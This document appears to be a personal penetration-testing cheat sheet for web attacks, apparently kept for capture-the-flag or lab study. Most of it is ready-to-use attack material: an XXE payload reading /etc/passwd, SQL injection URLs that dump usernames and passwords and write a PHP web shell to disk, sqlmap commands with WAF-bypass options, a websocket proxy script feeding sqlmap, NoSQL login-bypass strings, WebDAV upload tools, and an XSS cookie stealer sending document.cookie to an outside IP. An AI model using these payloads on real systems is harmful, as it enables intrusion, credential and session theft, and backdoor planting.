# Cross Site Scripting (XSS)
:information_source: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)
:information_source: https://www.scip.ch/en/?labs.20171214 
:information_source: https://xss-game.appspot.com/
:information_source: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
:information_source: https://github.com/payloadbox/xss-payload-list
:information_source: https://tryhackme.com/room/learnowaspzap

# XML External Entities (XXE)
Basic idea: upload an xml to test if it gets parsed and then abusing the doctype definition (DTD).

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

# SQL Injection
## Resources
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
* https://github.com/payloadbox/sql-injection-payload-list

## Manual Enumeration
```
http://10.10.10.10/debug.php?id=1 order by 1 # increase until an error occurs to get number of columns

http://10.10.10.10/debug.php?id=1 union all select 1, 2, 3
http://10.10.10.10/debug.php?id=1 union all select 1, username, password
http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

## sqlmap
* example commands
```
sqlmap --url http://10.10.128.77:8000/sqlpanel --tables --columns
sqlmap -r sqlpanel.request --dbms=sqlite --dump-all --tamper=space2comment
```
* capture sqlpane.request with burpsuite first
* --tamper=space2comment for trying to bypass WAF
* It is worth to try to increase the risk and level parameter e.g.
```
sqlmap -r req --batches --risk 3 --level 5
```
* You can also specify the technique with ``--technique=T``
    * B: Boolean based
    * E: Error based
    * U: Union-query based
    * S: Stacked queries
    * T: Time-based blind
    * Q: Inline queries



# Server Side Template Injection (SSTI)
Server-side template injection is a vulnerability where the attacker injects malicious input into a template to execute commands on the server-side

* See https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
* Payload Generator: https://github.com/VikasVarshney/ssti-payload

## SQLi websocket
sqlmap can not handle websocket requests therefore the following python script is needed to proxy the requests to the websocket:
```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://localhost:8156/ws"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line	
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
	
	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"employeeID":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False
				
			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
```
adjust the port and path and execute it
in another terminal run
```
sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
```

Make sure to try every syntax
```
*{}
${}
#{}
```

# NoSQL Injection
* https://book.hacktricks.xyz/pentesting-web/nosql-injection

Check with the following characters for NoSQL database (if the webserver is responding with a 50X response code)
```
'"\/$[].>

# Examples
username[$ne]=1$password[$ne]=1
username[$ne]=toto&password[$ne]=toto
username='"\/$[].>&password=admin
username=admin'||'1==1&password=admin
```

# WebDAV
WebDAV is an extenstion of HTTP that allows clients to perform remote Web content authoring operations. RFC4918.

## Resources
* [Blogpost from Nullbyte](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/)
* HackTheBox: Granny 

## davtest
DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target.
```
davtest -url http://10.10.10.15
```

## cadaver
Cadaver is a simple command-line client, similar to for example the 'ftp' program. It has some advanced features such as lock-management, property management, DASL and version control support.
```
cadaver http://10.10.10.15/mfu
```

# Cookie Stealer
```
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
```

See Github Repo 'Redline'
